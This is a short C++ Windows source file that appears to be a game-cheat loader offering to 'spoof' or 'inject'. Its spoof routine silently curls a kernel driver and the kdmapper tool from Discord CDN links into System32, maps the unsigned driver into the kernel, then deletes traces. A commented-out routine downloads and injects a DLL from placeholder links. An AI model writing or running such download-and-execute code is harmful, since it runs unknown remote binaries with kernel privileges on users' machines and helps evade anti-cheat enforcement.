#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <math.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <winioctl.h>
#include <d3d9.h>
#include <dwmapi.h>
#include <string>

std::string reply;

void spoofy()
{
	system("curl https://cdn.discordapp.com/attachments/845330680547770419/948641707703033886/spoof.sys --output C:/Windows/System32/spoof.sys >nul 2>&1");
	system("curl https://cdn.discordapp.com/attachments/890464568478957599/896327811151855616/kdmappernew.exe --output C:/Windows/System32/kdmappernew.exe >nul 2>&1");
	system("curl  --output C:/Windows/System32/spoof.sys >nul 2>&1");
	system("C:/Windows/System32/kdmappernew.exe C:/Windows/System32/spoof.sys");
	std::cout << ("\n");
	system("del spoof.sys >nul 2>&1");
	system("del kdmappernew.exe >nul 2>&1");
}

void injector()
{
	system("curl ADD PASTED DLL LINK HERE --output C:/Windows/System32/Pasted.dll >nul 2>&1");
	system("curl ADD PASTED INJECTOR, IDK FACE OR SOMETHING --output C:/Windows/System32/inject.exe >nul 2>&1");
	system("curl  --output C:/Windows/System32/spoof.sys >nul 2>&1");
	system("C:/Windows/System32/inject.exe C:/Windows/System32/Pasted.dll");
	std::cout << ("\n");
	system("del pasted.dll >nul 2>&1");
	system("del inject.exe >nul 2>&1");
}

int main()
{
    std::cout << "Press [1] - To spoof || Press[2] To inject\n";
	std::cin >> reply;

	if (reply == ("1"))
	{
		spoofy();
		Sleep(-1);
	}

	else if (reply == ("2"))
	{
	//	injector();
		std::cout << ("LOL NICX IS SO MEAN I GOTTA ADD MY OWN PASTED SHIT");
		Sleep(-1);
	}
}